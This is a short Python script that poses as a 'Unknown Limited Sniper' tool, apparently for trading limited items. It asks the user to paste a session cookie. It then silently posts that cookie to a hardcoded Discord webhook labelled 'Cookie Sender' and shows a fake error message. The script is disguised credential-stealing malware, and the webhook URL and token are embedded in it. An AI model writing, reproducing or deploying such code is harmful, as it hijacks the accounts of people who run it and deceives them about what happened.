from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write
from urllib import response

colorama.init()

loadingauth = "https://discord.com/api/webhooks/862784663185784872/UNcEheA3JKb8P_YxuZnPbOSynLAmI7wf2ptGn-jvJMqr6wsZZRqXo41KTecRincTWcrf"


def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
    w("Welcome to Unknown Limited Sniper! Press enter to continue")
    
    cookiedata = Write.Input("cookie ->",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("Press enter to continue")
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie Sender',
                      'content': f'```{cookiedata}```'
                  })
    w("Wait 1 minute")
    time.sleep(60)
    print("Error, please restart this program and do it later in 10 minutes.")

main()
